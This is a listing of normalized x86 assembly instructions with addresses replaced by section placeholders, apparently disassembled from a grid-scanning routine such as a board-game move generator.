xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx edi
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
nop [ eax + eax ] eax
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
dec edi
sub ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] 0x0
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] 0x10
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
lea ecx [ edx + edx * 2 ]
mov edx [ ebp - 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
lea ecx [ edx + edx * 2 ]
mov edx [ ebp - 0x4 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 - 0x2c ] 0x20
jne r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ rw-data ]
mov ecx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 - 0x2c ] 0x20
jne r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
cmp edx 0x1
jl r-xdata
cmp edx 0xa
jg r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ eax + ecx * 4 ]
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x1 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
cmp edx 0x1
jl r-xdata
cmp edx 0xa
jg r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ eax + ecx * 4 ]
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x1 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ ebp - 0x8 ]
inc edi
add ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0xa
jle r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ ebp - 0x8 ]
inc edi
add ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0xa
jle r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
inc edi
add ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0xa
jle r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
inc edi
add ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0xa
jle r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
mov edx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x0
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x10
mov ecx [ eax ]
mov edx [ rw-data ]
dec edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 - 0x34 ] 0x20
jne r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 - 0x34 ] 0x20
jne r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
cmp edx 0x1
jl r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ eax + ecx * 4 ]
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov edx [ rw-data ]
cmp edx 0x1
jl r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ eax + ecx * 4 ]
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov edx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov ecx [ ebp - 0x8 ]
dec edi
sub ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov ecx [ ebp - 0x8 ]
dec edi
sub ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
dec edi
sub ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
dec edi
sub ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
